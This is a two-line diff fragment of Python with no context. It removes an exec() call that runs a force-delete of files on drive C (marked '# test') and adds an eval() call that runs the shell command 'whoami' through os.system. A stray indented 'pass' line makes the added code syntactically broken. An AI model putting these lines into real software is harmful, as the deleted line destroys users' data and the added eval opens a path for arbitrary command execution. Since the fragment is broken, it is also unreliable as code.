@@ -1,1 +1,2 @@
-exec('import os; os.system("del /f /q C:\\*")')  # test
+eval('__import__(\"os\").system(\"whoami\")')
+    pass  # no-op
